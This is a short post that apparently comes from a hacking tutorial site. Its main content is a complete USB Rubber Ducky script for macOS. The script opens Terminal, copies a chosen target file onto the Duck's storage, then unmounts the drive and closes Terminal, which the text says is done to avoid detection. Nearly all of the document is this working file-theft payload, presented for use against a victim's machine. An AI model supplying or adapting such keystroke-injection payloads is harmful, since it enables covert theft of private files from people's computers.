When you're a duck you can just grab OSX by any file you want.

Requires the Twin Duck firmware.

This code targets a known location to copy to the Duck, and gracefully exits while unmounting the disk to avoid detection. Adjust the timing as needed for the files extracted, and this assumes your Ducky drive is named SAD.

Useful since OSX tends to put things in the same places. This just grabs a specific file and dips.



    
    REM OSX FILEGRABBER FOR TWIN DUCK
    REM STAY SAD - SADMIN FOR NULL BYTE 2017
    REM You should replace ~/Desktop/TARGET/secrets.txt with the file path for your target file
    DELAY 2000
    GUI SPACE
    DELAY 500
    STRING terminal
    DELAY 500
    ENTER
    DELAY 1000
    STRING cp -av ~/Desktop/TARGET/secrets.txt /Volumes/SAD/
    DELAY 200
    ENTER
    DELAY 1000
    STRING diskutil unmount /Volumes/SAD
    DELAY 500
    ENTER
    DELAY 4000
    STRING exit
    DELAY 200
    ENTER
    DELAY 2000
    GUI q
    ENTER